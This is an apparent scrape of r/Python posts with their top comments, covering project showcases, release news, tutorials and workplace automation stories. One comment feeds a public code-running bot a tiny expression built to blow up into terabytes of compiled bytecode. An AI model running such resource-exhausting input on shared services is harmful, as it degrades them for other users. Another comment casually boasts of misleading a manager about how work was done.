Try using not just the current frame but a series of past frames as well. This will significantly improve recognition."
I made an automated machine learning bot that can detect diseases using images within seconds,hm9pih,2020-07-06 23:28:10,,"Good work! Using AI for interpreting certain pathologies on chest radiograph has been done many, many times. However , it’s nice seeing concise python code on using Keras to train a simple model.

EDIT: this is coming from a radiologist who regularly vets AI algorithms with an emphasis on automated pathology detection on chest x-rays."
"I made an app to watch music videos for the songs playing on your PC, while trying to synchronize them.",f29iod,2020-02-11 23:03:36,,"Wow! This could be great for cafes and other venues showing mtv and such 
Thanks for sharing"
"Introducing JustPy: An object-oriented, component based, high-level Python Web Framework that requires no front-end programming. With a few lines of only Python code, you can create interactive websites without any JavaScript programming. Comes with a comprehensive tutorial",f1qmsj,2020-02-10 21:56:34,"# JustPy

[JustPy Docs and Tutorials](https://justpy.io)

## Introduction

JustPy is an object-oriented, component based, high-level Python Web Framework that requires no front-end programming. With a few lines of only Python code, you can create interactive websites without any JavaScript programming.

Unlike other web frameworks, JustPy has no front-end/back-end distinction. All programming is done on the back-end allowing a simpler, more productive, and more Pythonic web development experience. JustPy removes the front-end/back-end distinction by intercepting the relevant events on the front-end and sending them to the back-end to be processed.

In JustPy, elements on the web page are instances of component classes. A component in JustPy is a Python class that allows you to instantiate reusable custom elements whose functionality and design is encapsulated away from the rest of your code.

Custom components can be created using other components as building blocks. Out of the box, JustPy comes with support for [HTML](https://justpy.io/#/tutorial/html_components) and [SVG](https://justpy.io/#/tutorial/svg_components) components as well as more complex components such as [charts](https://justpy.io/#/charts_tutorial/introduction) and [grids](https://justpy.io/#/grids_tutorial/introduction).  It also supports most of the components and the functionality of the [Quasar](https://quasar.dev/) library of [Material Design 2.0](https://material.io/) components.

JustPy encourages creating your own components and reusing them in different projects (and, if applicable, sharing these components with others).

JustPy supports visualization using [matplotlib](https://justpy.io/#/tutorial/matplotlib) and [Highcharts](https://justpy.io/#/charts_tutorial/introduction).

JustPy integrates nicely with [pandas](https://pandas.pydata.org/) and simplifies building web sites based on pandas analysis. JustPy comes with a [pandas extension](https://justpy.io/#/charts_tutorial/pandas?id=using-the-pandas-extension) that makes it simple to create interactive charts and grids from pandas data structures.

For updates and news please follow the [JustPy Twitter account](https://twitter.com/justpyframework)

## Hello World!

    import justpy as jp
    
    def hello_world():
        wp = jp.WebPage()
        d = jp.Div(text='Hello world!')
        wp.add(d)
        return wp
        
    jp.justpy(hello_world)

The program above activates a web server that returns a web page with 'Hello world!' for any request. Locally, you would direct your browser to [http://127.0.0.1:8000](http://127.0.0.1:8000) or http://localhost:8000/ or  to see the result.

Here is a slightly modified version in which 'Hello world!' changes to 'I was clicked!' when it is clicked.

    import justpy as jp
    
    def my_click(self, msg):
        self.text = 'I was clicked!'
    
    def hello_world():
        wp = jp.WebPage()
        d = jp.Div(text='Hello world!')
        d.on('click', my_click)
        wp.add(d)
        return wp
    
    jp.justpy(hello_world)

Many other examples can be found in the [tutorial](https://justpy.io/#/tutorial/getting_started)

## Under the Hood

JustPy's backend is built using:

* [starlette](https://www.starlette.io/) \- ""a lightweight [ASGI](https://asgi.readthedocs.io/en/latest/) framework/toolkit, which is ideal for building high performance asyncio services"".
* [uvicorn](https://www.uvicorn.org/) \- ""a lightning-fast [ASGI](https://asgi.readthedocs.io/en/latest/) server, built on [uvloop](https://github.com/MagicStack/uvloop) and [httptools](https://github.com/MagicStack/httptools)"".

JustPy's frontend (which is transparent to JustPy developers) is built using:

* [Vue.js](https://vuejs.org/) \- ""The Progressive JavaScript Framework""

The way JustPy removes the frontend/backend distinction is by intercepting the relevant events on the frontend and sending them to the backend to be processed.

## License

[Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0.txt)","This looks great. As a non-web dev, this seems like a good way to stand up a web resource without having to worry about the front end. Usually, at my job, I have to stand up a web resource for 10-100 internal users, and I'd love a way to do that in 100 percent python."
Approx 6 months back. I was asking help to practice and learn python in this sub. With the support of this sub yesterday I contributed in one of the DL project of arrow and color detection at the right spot which is to be implemented in self driving rovers. Thank you all.,cof3mi,2019-08-10 15:34:06,,Hi i wonder now how fast could you code this exact project from scratch?
"Python patch, first try.",8t5ouh,2018-06-23 07:11:50,,Is it multithreaded?
"I just had a baby, so naturally I had to program a tool for deciphering his schedule",lmnd6w,2021-02-18 21:59:38,"*(TLDR at the bottom)*

**THE SITUATION**

My son came into the world last month and, as first time parents, we've had a hard time handling his hectic feeding schedule. He would burst into screams, and we'd scramble to get a bottle prepared/warmed. However there wasn't a very good way to know how much milk to warm (once you heat it, it has to be either consumed or discarded). And since a bottle takes 5+ minutes to heat up, we'd spend that time fumbling to soothe him until it was ready. After one-to-two weeks of this, I decided to do something about it.

That's why I created a Python project to take out the guesswork! From the beginning, we were logging all of his feeds because we wanted to make sure he was eating enough (and wasn't eating too much). We use a shared Google Keep note because that's the easiest/quickest way to do it on our phones. And since we'd already gotten into the habit of logging data, I figured 'why not use it to predict when the next bottle will be demanded?'

**WHAT IT DOES**

The program scrapes all of the content from the Google Keep note and then uses it to estimate the next feed. This estimation includes not only the time, but also the quantity of milk to prepare. It's based on the patterns exhibited over the prior three days, and takes into account both his bottle feeds and his direct breastfeeds. My original goal was to create a legitimate predictive model of his feed patterns, but it quickly became apparent that an explicit model wouldn't be the best strategy (largely due to the irregularity of the feed time data points).

Once it has crunched the data, the program emails both of us with the outputs. Each email contains two distinct sections: the estimates and the summary. The estimates are the metrics related to the next anticipated bottle (feed time and milk quantity) and they've been pretty accurate so far. The summary includes things like average total daily intake / average feed size / average time between feeds / etc. It's just something I threw in to give us some trending insight, but it's turned out to be immensely helpful -- particularly when answering questions at the pediatrician's office.

**ADMIN/SETUP**

The program is 100% Python, but it does include some non-standard libraries: gkeepapi and pandas. Unfortunately, Google doesn't support API access for Google Keep (why not??) and we weren't willing to change the way we log data. But luckily [gkeepapi](https://github.com/kiwiz/gkeepapi) exists, and that has proven to work great. The downside is that frequently accessing the Keep note through unofficial means caused Google to regularly prompt me to verify my account activity, which got *very* old *very* quickly. To mitigate that, I added a feature in the program to only check the note when there's likely to be new information there. Since adding that, Google has stopped bugging me about it.

Using Launchd, I've scheduled the program to run every ten minutes. It can obviously be run manually as well, but it can be run as often as desired. Even if it's run very frequently, it won't access the Keep note or send an email unless there's likely to be new data to consider.

One goal for this project was that the Google Keep note wouldn't have to change formats from what we'd been doing from the start (we wanted to keep formatting the note lines in the way that was easiest/most intuitive for us). As a result, the format which will allow the program to interpret dates/times/quantities is somewhat rigid. Anyone who uses the program will need to emulate our log style or rewrite the code which extracts data. Another goal for the project was that I'd get some pandas practice in. I admit that pandas was likely overkill for this application, but I wanted to get some experience using it and this project has definitely helped me with the basics.

**NOTES**

The mins/maxes for the time between feeds and the quantities of milk are based on standards for the baby's age (stored in age\_info.txt). My son has been fairly consistent/normal with his feeds, so the generally accepted mins/maxes work just fine. But if -- for example -- a baby wanted to eat every hour, the minimum milk quantity per feed would probably be too much.

Since I made this project for my own use and don't really expect other people to use it, there are some hardcoded values. Nothing major -- just people's names for the email, and the note ID for accessing the Google Keep note.

&#x200B;

[GitHub repo](https://github.com/tyler-england/forecast-bottle)

&#x200B;

**TLDR: The program reads a Google Keep note of baby feed data and sends out an email about how/when to prepare the next bottle. It's been very useful. :)**",Looks very good. How accurate are the predictions?
"I created an AI to play ""Flappy Bird"": my first steps into AI (using Pygame and NEAT-python)",eg2be8,2019-12-27 06:50:00,,source code: [https://github.com/seppeEnZigie/NEAT\_flappy\_bird](https://github.com/seppeEnZigie/NEAT_flappy_bird)
TIL that seaborn refuses to use the jet color scheme in a most wonderful fashion,8psk37,2018-06-09 20:44:58,,"Here is why `jet` is a bad color map: http://jakevdp.github.io/blog/2014/10/16/how-bad-is-your-colormap/

tl;dr; It was once the default for matplotlib, but it sucks because the colors lie to you. The perceived luminance of the gradient jumps all over the place and you might see highlights and features that simply are not there."
Python 3.11 is out! Huzzah!,ycmnor,2022-10-25 05:05:40,"https://www.python.org/downloads/release/python-3110/

Some highlights from the release notes:

PERFORMANCE:  10-60% faster code, for free!

ERROR HANDLING:  Exception groups and except* syntax.  Also includes precise error locations in tracebacks. 

ASYNCIO:  Task groups

TOML:  Ability to parse TOML is part of the standard library.  

REGEX:  Atomic grouping and possessive quantifiers are now supported

Plus changes to typing and a lot more. Congrats to everyone that worked hard to make this happen.  Your work is helping millions of people to build awesome stuff.  🎉","> PERFORMANCE: 10-60% faster code, for free!

Wait what ? Seriously ?"
Python 201 Book is Free for 48 hours,57xaud,2016-10-17 21:26:35,"I decided it would be fun to give my latest book away for free for 48 hours. So starting today, you can get **Python 201: Intermediate Python** free through [Gumroad](https://gumroad.com/l/py201#) or [Leanpub](http://leanpub.com/python201/c/201free). 

If you go with Gumroad, then you will need to use the following offer code: **201free**. Note that if you want to receive updates to the book, you will want to create an account and add the book to your library. 

I currently support the following digital formats: **PDF**, **epub** and **mobi** 

You might also want to check out my blog which has lots of fun Python tutorials and links to my other books: http://www.blog.pythonlibrary.org/

**Update 2016-10-17**: For those of you who like numbers, I thought I'd share a bit of statistics with you. The number of people who used the Leanpub link to download the book hit **18,037** while approx. **6670** people used the Gumroad coupon. I don't have a simple way of checking who used both sites, so assuming that no one did, the total number of new readers is **24,707**!

That's so awesome! Thanks so much for your interest. I hope you all enjoy the book!",Thank you!
Automated My Job for the First Time,izdclm,2020-09-25 12:54:21,"So this just happened today. I've been learning Python on and off for a long time. I had to take a couple of classes for my undergrad a couple years back, and after that, I never really needed to apply it in my job.

Fast forward to today, my manager was complaining about how many requests for test data the business team was giving him. He tasked me with helping him generate the data using Excel and advanced SQL logic.

I decided to dust off my rusty Python scripting knowledge and created a script that automated the entire process. It took many hours, a lot of googling and 2 mugs of coffee, but I accomplished what I set out to do. My script was able to generate nearly 5000 queries in less than a minute.

Needless to say, my boss was impressed by my initiative, and I've found out first hand how useful knowing Python is. I want to thank this subreddit for being so supportive and always promoting new learning resources. Automate the Boring Stuff is a gold mine of info and I am more motivated than ever before to expand my skills and knowledge!

**Edit:** Wow! I never really expected this post to blow up like it did. Thank you all for the awards. Never really gotten any of them before, as I mostly lurk and don't post. Yesterday was an anomaly because I just felt grateful for subs like this one. I just wanted to take the time to clarify some things.

To those people who are worried about my boss' reaction, don't be. I am extremely lucky to have a boss who cares for all his employees (even me, the part timer with very little IT experience). To give a bit of background, he and my father are friends, so he's taken me under his wing, teaching me how to handle myself in a professional environment and helping my career by exposing me to new opportunities within the project we 're working on. Needless to say, over the past few months, I've been assigned many different tasks on both the business and engineering side, learning a lot in the process that will be invaluable to my career in the future.

Regarding an increase in pay, I've put in the paperwork to go full time, and I gained his approval a few weeks back because of how much effort I put in to making sure I completed my tasks to the best of my abilities. I think this ensured that he would back me up 100% if anyone tried to object. Hopefully by the beginning of October, I'll be billing for 40 hours instead of 24.

I love the team and company I work for, as everyone is super friendly and willing to help me out. Also, part of the reason I automated this task was because it helps my boss politically. I'm not too well-versed in office politics, but he's been giving me lessons on how to handle it. By being able to provide thousands of data points for the business team, he now has them on the back foot and they have to work hard to fulfill their end of the testing, otherwise they're going to be the ones with egg on their face if the issue gets escalated to the executive levels.

I only had two mugs of coffee because my mom yelled at me for drinking coffee late at night and banned me from the kitchen. :D

&#x200B;","Well done, it feels good once it's working.

I once used Python to save my team 8 hours a day recording figures from competitor websites.

My manager said ""this isn't what I asked you to do!"" and demanded we go back to doing it manually...  It wasn't about the figures, it was about control.

So we all said we did it manually and let my code do the work :D"
Generating a random maze using Prim's algorithm,g0fz1e,2020-04-13 17:55:15,,"Is that almost always gonna generate a diagonal-ish path?

Given that the frontier seems to expand at an equal rate, so that part will reach the goal first?"
PyCon US 2021 Notes,nfes13,2021-05-19 00:13:54,,These are the notes from the talks I attended on the first day of PyCon. What were your favorite talks? Are there any talks I missed that I should check out?
Python Fractal Landscape,7cffpd,2017-11-12 21:41:55,,"I watched the Nova documentary ""Fractals - Hunting the Hidden Dimension"" on Youtube, and was interested  in the story of a computer graphics engineer at Boeing, Loren Carpenter, who created the first computer-generated mountain landscapes. He did this after reading Benoit Mandelbrot's book about fractals, and created the landscapes by diving them into progressively smaller triangles. I tried out the idea with a small Python script.

To set up an easy coordinate system, I used squares split diagonally into right-angle triangles, which could be split into smaller right-angle triangles with random elevations. That's somewhat imperfect but is enough to test the idea. I used the ""Mayavi"" Python library for 3D visualisation (since it was in the Ubuntu repository) to display the result.

I thought this group might be interested in the result.

My test had just 20 lines of Python.

[Code on Pastebin](https://pastebin.com/xfyxWWk5)

[Code on Github](https://github.com/dafarry/python-fractal-landscape)

The image shown was generated with ""random.seed(6)"" added. Rotation, zoom and background colour were set interactively in the Mayavi visualizer.

The Python code was dashed out as a quick test, so the method of finding the correct corner points in the correct order is not very readable. Sorry about that. After writing this test, I Googled for the algorithms usually used in fractal landscape generation and found out about the fractal terrain ""diamond square algorithm"", so if you want to know more about this subject, then I suggest you do the same.

Edit: [Here's two more landscapes on Imgur](https://imgur.com/a/JYqth)
"
"Alright, which one of you was this? Haha had to stop and take a pic",afc6rw,2019-01-13 05:54:48,,mine is ASYNCIO
"Flask 2.0 is coming, please help us test",msbt3p,2021-04-17 04:30:39,"Hello,

Flask 2.0 is due for release soon, with a release candidate 2.0.0rc1 available now on PyPI. Please try this out and let us know if there are any issues.

    pip install --pre flask

This major release of Flask is accompanied by major releases of [Werkzeug](https://www.reddit.com/r/Python/comments/lfe76k/werkzeug_flask_20_is_coming_please_help_us_test/), [Jinja2](https://github.com/pallets/jinja/blob/master/CHANGES.rst), [click](https://github.com/pallets/click/blob/master/CHANGES.rst), and [itsdangerous](https://github.com/pallets/itsdangerous/blob/master/CHANGES.rst) which we'd also welcome and appreciate testing (their pre releases are installed with the Flask pre release).

Some highlights from [Flask's Changelog](https://github.com/pallets/flask/blob/master/CHANGES.rst),

- Support Python 3.6+ (dropping Python 2.7 and 3.5 support)
- Deprecate a number of features (see details).
- Initial async-await support (optional install flask[async]), that allows for async route handlers, errorhandlers, before/after request, and teardown functions.
- Short form route decorators e.g. @app.get, @app.post, etc...
- Nested blueprints, blueprint.register_blueprint(another_blueprint).
- Much more! (Please ask)",Can you expand on async route handlers? What does the performance improvement look like? How was it measured?
16 bytes of Python code compiles to 32 terabytes of bytecode,llccey,2021-02-17 04:06:28,,"+/u/CompileBot python

    (1<<19**8,)*4**7"
Twitter is opening up its full tweet archive to academic researchers for free,l5ldye,2021-01-27 03:24:13,"Opening up a public archive, monthly tweet volume cap is now 10 million (20x higher than previous 500,000). This definitely opens the door for new projects built using the Twitter API, especially in the field of sentiment analysis.

[https://www.theverge.com/2021/1/26/22250203/twitter-academic-research-public-tweet-archive-free-access](https://www.theverge.com/2021/1/26/22250203/twitter-academic-research-public-tweet-archive-free-access)

https://blog.twitter.com/developer/en_us/topics/tips/2021/enabling-the-future-of-academic-research-with-the-twitter-api.html",Sentiment analysis
I made this free tool for practicing Python (it's like Duolingo for learning to code),8juoum,2018-05-16 20:56:49,,"This is amazing, but the preview of the page on mobile just says ""dab"" in big letters"
"I made a randomized binary tree (python, tkinter)",g1conv,2020-04-15 03:58:52,,Would u care to share the source? I'd love to take a look
I'm sorry r/Python,qlnune,2021-11-03 13:43:33," Last weekend I made a controversial comment about the use of the global variable. At the time, I was a young foolish absent-minded child with 0 awareness of the ways of Programmers who knew of this power and the threats it posed for decades. Now, I say before you fellow beings that I'm a child no more. I've learnt the arts of Classes and read The Zen, but I'm here to ask for just something more. Please do accept my sincere apologies for I hope that even my backup program corrupts the day I resort to using 'global' ever again. Thank you.

&#x200B;

https://preview.redd.it/b1oncwh1jbx71.png?width=909&format=png&auto=webp&s=eeedba9a630f83071e5694664ca372259424d54c","you made a mistake, and you learned from it.  nothing to apologize about(unless you were being an ass about it elsewhere in the thread).

the path to enlightenment is fraught with peril."
The youtube-dl GitHub repo has received a DMCA takedown request from the RIAA,jgvqa9,2020-10-24 05:02:31,,"The source code of youtube-dl is not the thing causing any copyright infringement. We saw this in the early 2000s with kazaa, napster and others. To download the content (consume) is not illegal. to upload the content (share) technically is illegal. This is nothing more than a scare tactic being used to turn a tool off. They have no legal basis for this notice. They cant do shit.

the repo should be reopened

---

Edit: using top comment to promote open source code.

If you want a copy before it disappears (it will need to be maintained in order for it to continue to work) then click this link. It will appear like you have an error/dead end; wait 5-10 seconds and the download starts

https://web.archive.org/web/20201017142607/https://github.com/ytdl-org/youtube-dl/archive/master.zip

---

Also PM me if you want to start a private repo"
I wrote a program to get the high score on a typing practice website,e3fwo2,2019-11-29 23:10:59,,"Code here:  [https://github.com/probe269/Typing](https://github.com/probe269/Typing)

Please let me know what you think!"
Rolling Hills (Made with Python Processing),d45ogl,2019-09-14 22:12:47,,"Tutorial: https://www.youtube.com/watch?v=H7EwbkBWnmA

GitHub Repo: https://github.com/erdavids/Cube-Towers

More Projects and Tutorials here: https://github.com/erdavids/Generative-Art"
I wrote a Python script which can generate any city from the real world in Minecraft,xtmxsp,2022-10-02 19:55:29,"Hi there! Using this Python script, you can generate any city from the real world in Minecraft. I worked on that project for a few months and finally released it as open source. I appreciate any kind of feedback!

Youtube Devlog: [https://www.youtube.com/watch?v=5tOvtZG0\_6k](https://www.youtube.com/watch?v=5tOvtZG0_6k)

Github Repository: [https://github.com/louis-e/arnis](https://github.com/louis-e/arnis)",“Finding where I am on Google Maps in 0.1 seconds but the image is blurry and the city has been generated in Minecraft”
"I would like to share my first game! I did it all with pygame. I'm still learning so it's not so cool, but I want to improve it in the future: P",h9su9s,2020-06-16 08:42:56,,Looks great... Can you share the script or upload on Github and then share the link?
My attempt at coding a GUI Maker (maybe helpful for beginners),fe3mgn,2020-03-06 06:45:54,,"What do you guys think? I know there are a lot of valid GUI makers but I don't really see them as a beginner-friendly option, that's why I tried to do something basic and that actually writes .py code.      
For now I just implemented the layout, so for bindings and other useful things you have to update the output code yourself.      
The widgets can be improved and I wanted to insert helpful tips or just descriptions for every Tk Widget and their arguments.       
Do you think it's useless and I shouldn't ""waste"" time on it or can it find someone who could have fun with it?      
Also, any tips for must-have options that I didn't mention?       
        
**EDIT:** [Here's the updated version](https://www.reddit.com/r/Python/comments/fets7z/update_on_the_visual_gui_maker_now_its_decent/)"
"Senior Python Programmers, what tricks do you want to impart to us young guns?",7cs8dq,2017-11-14 09:51:19,"Like basic looping, performance improvement, etc.","Random braindump

- Use Python 3.6, there are some significant improvements over 2.7 - like enums and fstrings (I would switch to 3.6 *just* for fstrings, TBH)
- `.open()` or `.close()` is often a code smell - you probably should be using a `with` block
- Use `virtualenv` for every project - don't install python packages at the system level. This keeps your project environment isolated and reproducible
- Use the `csv` module for CSVs (you'd be surprised...)
- Don't nest comprehensions, it makes your code hard to read (this one from the Google style guide, IIRC)
- If you need a counter along with the items from the thing you're looping over, use `enumerate(items)`
- If you're using an IDE (as a Vim user I say you're crazy if you're not using Pycharm with Ideavim) take the time to learn it's features. Especially how to use the debugger, set breakpoints, and step through code
- `multiprocessing`, not `threading`
- Developing with a REPL like ipython or Jupyter alongside your IDE can be very productive. I am often jumping back and forth between them. Writing pure functions makes them easy to test / develop / use in the REPL. ipython and Jupyter have helpful magics like `%time` and `%prun` for profiling
- Use destructuring assignment, not indices, for multiple assignment ```first, second, *_ = (1,2,3,4)```
- Avoid `*args` or `**kwargs` unless you know you need them - it makes your function signatures hard to read, and code-completion less helpful"
I am not good at modelling so I used Blender in a way to visulaize data. This is my first project with Python and Blender. The progress so far. (Link of the repo is in the comments),hkhp59,2020-07-03 19:50:53,,This is the most overkill way to plot a bunch of graphs. I love it.
I made a FTP/SFTP client using python and tkinter,8niot2,2018-05-31 22:07:52,,Github link: [https://github.com/RainingComputers/whipFTP](https://github.com/RainingComputers/whipFTP)
"For trading enthusiasts: I made a highly-efficient Python library that combines NumPy, Numba and Plotly to backtest trading strategies interactively",f99wh4,2020-02-25 21:00:21,,"It operates entirely on NumPy arrays and is powered by Numba to obtain orders-of-magnitude speedup over pandas. Furthermore, it integrates Plotly and ipywidgets to build interactive charts and complex dashboards akin to Tableau right in the Jupyter notebook.

[https://github.com/polakowo/vectorbt](https://github.com/polakowo/vectorbt)"
"Created a python script that execute Exploratory Data Analysis on any CSV file. It generates a text report, a series of plots and a processed csv file as outputs.",gl7lp7,2020-05-17 10:33:05,,Very cool however .... Take a look at glue (also called glueviz). This shit will blow your mind. https://youtu.be/TkMZ9gZ8xtk
tkinter was shockingly easy to write a small overlay GUI,op1tz0,2021-07-22 07:33:12,"I did a project mostly over the weekend to write a super simple small overlay for an online game. I wanted it just to include some updating text that displays the ping times to the server: https://github.com/notatallshaw/fall_guys_ping_estimate

**Edit:** The screen shot is in the above link, it's nothing special, it's some updating green text with a black background that sits on top of any application (you can't even move it yet). 

I was assuming to make an overlay feature I would need to use PyQt or wxWidgets. But it was actually just a few lines of tkinter  to get working. 

Despite having never done any non-web GUI programming I had a simple version up and running in less than an hour.  I definitely think I might make more quick tools with a GUI in the future.",Tkinter is cool. It doesn't look very native but it's quite powerful
I created a 40-minute tutorial that will explain everything you need to Containerize your Python applications using Docker!,lz5plv,2021-03-07 00:54:37,,"Well done, detailed but not boring (even for the parts that I already knew).

Kudos also for scaling up the font in your editor to make it easy to read.
I don't understand why not everybody does it."
Use python to find a prime number that looks like any image if glanced upon from far away. [OC],ekjr42,2020-01-06 06:03:41,,"How it's done:

We proceed in 5 steps:

1. We resize the image to contain at most a certain amount of pixels.
2. Run various image processing steps like edge enhancement and smoothing before converting the image into grey-scale (using Pillow)
3. We then quantise the image into just having 5 to 10 greyness levels.
4. Now we map each greyness level to a digit, et voila, we have embedded the  picture into a number.
5. It now remains to tweak some of the digits until we find a prime number that still looks like the image.

&#x200B;

*Note: According to the prime number theorem, the density of prime numbers is  asymptotically of order 1/log(n). Hence, if we have a number with m digits, the number of primality tests that we expect to do until we hit a prime number is roughly proportional to m. Since we use the Baillie–PSW primality test, the overall expected computational complexity of our prime searching procedure is O(n*log(n)³).

You can find the code @ [Github](https://github.com/LeviBorodenko/primify) and experiment yourself."
Python 3.7.0 released,8ue8kg,2018-06-28 07:02:20,,"> It will become the default in Python 4.0.

\*blinks\*"
Possibly the most terrifying O'Reilly cover I've ever seen,d17uyc,2019-09-08 15:14:40,,I agree. Embedded programming sometimes is the root cause of my sleepless nights...
We hand-picked the best Python libraries released in 2020,khmijy,2020-12-22 02:04:08,"Hello,

Every year, we produce a list of the **top 10 Python libraries** released or popularized that year.

2020 was a hard one, since there are so many good choices! Therefore, we decided we should list many more :) Most are around data science / machine learning.

**The full list is available here**: [https://tryolabs.com/blog/2020/12/21/top-10-python-libraries-of-2020/](https://tryolabs.com/blog/2020/12/21/top-10-python-libraries-of-2020/)

So:

* What do you think about our picks?
* Did we miss any good one? Especially non-data science libraries.",This is awesome. I have a application which I am struggling to get right. It will be a CLI interface. Will definitely look at typer and rich.
Made my first program to help me with my homework,fmo3e8,2020-03-22 06:13:43,,"Great!  I tell my Python students, ""If you're taking a math class, you've got loads of opportunities to write lots of Python, which is how you get better!""

One suggestion - instead of saying pi = 3.14, you can:

    import math
    area = math.pi * r * r

or even better:

    area = math.pi * r**2"
Malicious Webpage Classifier using DNN [Pytorch],nhm8bc,2021-05-21 14:56:34,"Malicious Webpages are the pages that install malware on your system that will disrupt the computer operation and gather your personal information and many worst cases. Classifying these web pages on the internet is a very important aspect to provide the user with a safe browsing experience.   


The objective of this project is to classify the web pages into two categories *Malicious\[Bad\]* and *Benign\[Good\]*  webpages.  Exploratory Data Analysis and Geospatial Data Analysis are done to get more insights and knowledge about the data. Features are engineered and the data is preprocessed accordingly. A total of four ML  and DL models are trained. The models are **XGBoost**, **Logistic Regression**, **Decision Tree** and **Deep Neural Network**. The DNN is implemented in PyTorch and the others are implemented using scikit learn.

[Kaggle Notebook](https://www.kaggle.com/sumitm004/malicious-webpage-classifier-using-dnn-pytorch)",What is up recently with all these posts with +1000 upvotes but barely any comments?..
I automated a full time full before it could be advertised,ktj4jq,2021-01-09 11:42:30,"Thought this was funny. I work as an Accountant and last week my Manager let me know that due to a Government audit we would be required to fully itemise our government funding client statements. 

The problem is that our client statement involve charges from third party companies who are paid from this government funding and all these invoices are held on a third party website. 

The third party website said they couldn't help and it was determined that due to how slow the website is as well as other factors (the invoices are all listed as individual download links, some invoices are password protected pdf's, some are jpg's, the website layout is terrible) that it would require 160-180 hours of manual work and therefore a new admin person would need to be hired.

So I wrote something in Python that opens a headless browser, grabs all client names, then goes through each clients account and downloads every invoice, skips any client with no invoices, converts all jpg's to pdf's and resizes them so they fit correctly on the page and merges all invoices into one file per client to form our new statement file.

It takes about about an hour to create 800 statements from 6000 invoices, about half of that time being due to how slow the website is but I'm pretty happy with it and it can now do in a lunch break what we were preparing to hire an entirely new person to do.

I'm still a beginner with Python but I feel like this was a good step in the right direction.

This did make me wonder though, how is it that jobs that are almost fully admin and could be automated are still so common. I remember about ten years ago all I ever heard in school was that automation was going to kill these jobs but it doesn't really seem to have made much progress.","It's still common because software maintenance is a liability. You don't want to make your business dependent on technology nobody understands, and many companies don't want to pay for staff who understand how to support software.

I've been told many charities cease to exist because somebody loses a laptop, despite the fact that backup technology is pretty basic and easy to manage. It's simply that the skills don't exist in the organisation and they don't know or care to acquire them in addition to the skills deemed fundamental to the business.

The kicker is that companies don't do this because they don't view themselves as technology businesses. But all businesses are technology businesses."
"Got a job that requires Python and Django developement, also using Tkinter and Pyqt for desktop apps.",pi88q6,2021-09-05 14:57:25,"Good day everyone, as explained in the title, I got a job that requires coding in python and Django, I am more of a javascript developer, as I know node, react and do web development mostly. They also have a desktop app and I may need to work on those too, granted they know I might go through a learning process but I don't want to disappoint myself,, and also this seems like a big break for me.

I need help on where to get resources in the event I am stuck, what are the things I may need to know that I will be using daily in a development environment especially for the desktop applications, I have been told to ask the senior developers (they're mostly freelance), I'm also expected to fix bugs too, I need help on resources and where I can get help asap. Thank you, everyone",Relax and read a recent book/take a Udemy class on Tkinter. Python is also extremely inspectable with the debugger.
Library for making desktop apps like React,cljawn,2019-08-03 22:24:47,,"If you are looking for a good ui cross-platform library in Python, I recommend [Kivy](https://kivy.org/)"
Ask microsoft to include Python in Windows by default,3l0o5p,2015-09-15 16:12:14,,"This came up at Pycon, but there was concern that people wouldn't update the included Python, so in a few years, we'd all be stuck writing code for the version that was included.

It was also suggested that there could be a dummy `python.exe`, and when you tried to run it, it would let you easily install the latest Python version. OS X does something similar for tools like `git`. But that could have some of its own problems, e.g. if code checks for a `python` command to see if Python is installed."
15+ Free Python Projects for Beginners with full tutorial walkthroughs,ig81x0,2020-08-25 16:19:43,,"hey all

this is still a work in progress but would  love any feedback. I've taught a lot of beginners Python and there are  always the same two problems

a) Setup: everyone is like 'just use  conda' or 'just use x', but in honesty setting up Python is a nightmare  even in 2020 and it's a huge tripping point for beginners. I was really  happy to start using Repl.it to teach beginners as it sidesteps all the  set up issues until they've caught the 'programming bug'. (disclaimer:  repl.it sponsored this project but I initially reached out to them as I  liked their product so much)

b) ""I don't know what to build"" - even after learning to code, beginners often lack inspiration or ideas.

I  tried to solve both of these problems with this course. It's not meant  to substitute a ""normal"" course - the theory of data structures,  algorithms, and even basic functionality like looping and conditional  logic is not explicitly covered. The idea is that people will do this  alongside a theoretical course (or just the Python documentation) or  shortly after.

Feedback appreciated :)"
"Python programming: We want to make the language twice as fast, says its creator",ncbzhp,2021-05-14 23:58:07,,"> Speed in the Core Python (CPython) is 

CPython stands for ""the Python interpreter written in C language"", not ""Core Python"". On similar naming lines, there is also Jython, written in Java, etc, and then there is Cython, which compiles certain annotated python files into C (for speedups)."
Call for questions for Guido van Rossum from Lex Fridman,y7q4gv,2022-10-19 10:19:16,"Hi, my name is Lex Fridman. I host a [podcast](https://www.youtube.com/c/lexfridman) and I've [previously interviewed Guido van Rossum](https://www.youtube.com/watch?v=ghwaIiE3Nd8) (4 years ago). I'm talking to him again soon and would like to hear if you have questions/topic suggestions, including technical and philosophical ones, on Python or programming in general.","Does Guido have any projects that are not  Python, that he wish more people knew about?"
Tired of checking craigslist for used cars so I made a python program to do it and send emails replies to good deals,c6uk99,2019-06-29 12:40:09,,"Wait, how do you identify good deals?"
"This is really amazing! If this person can make this sort of thing in his living room, I wonder what people with resources like at Google or CMU Navlab must be doing.I don't think I would need to renew my driving license.",j7yl1g,2020-10-09 21:06:45,,It's the long tail of scenarios that are difficult to solve not stop signs
Is This Headline Fake or Not? (isthisheadlinefake.com),h8b1y6,2020-06-14 00:51:15,,"It looks really cool. But I would personally recommend that it should be more obvious to the player wether or not it was real. You can definitely see it, but for the first half of the video I didn't spot the small text saying if it was real or not."
"Spotlightify (The Spotify overlay controller) Update - New Features added and Source Code Released! (Windows, macOS and Linux tested)",gtnyll,2020-05-31 07:08:19,,Created using the Pyqt5 and Spotipy libraries
My girlfriend remade the Python logo with punch-needle.,t78212,2022-03-05 20:02:08,"[Image here](https://i.redd.it/u72tby6t0kl81.jpg)

I just wanted to share her creation. I think it looks very cute and I will for sure have it next to me in my office. It was actually quick to put together but the end result looks amazing.

Punch needle is a way to do embroidery on canvas with wool and a special needle. 

She is also a Python dev and she said that there is some overlap between the dev community and the knitting/embroidering/crochet community. Anybody else does the same?",    from threading import Thread
best-of-python: A ranked list of awesome Python libraries and tools,kx94kc,2021-01-15 00:34:49,"https://i.redd.it/n54xmlw9sbb61.gif

We've curated a list of the **best Python libraries and tools**!

The list is fully automated via GitHub Actions, so it will never get outdated. Every week it collects metadata from GitHub and package managers, calculates quality scores to rank projects inside categories, and identifies trending projects.

🔗 GitHub: [https://github.com/ml-tooling/best-of-python](https://github.com/ml-tooling/best-of-python)

🎉 We also released a few other best-of lists on Reddit today:

* [best-of-ml-python](https://github.com/ml-tooling/best-of-ml-python): Python libraries for machine learning.
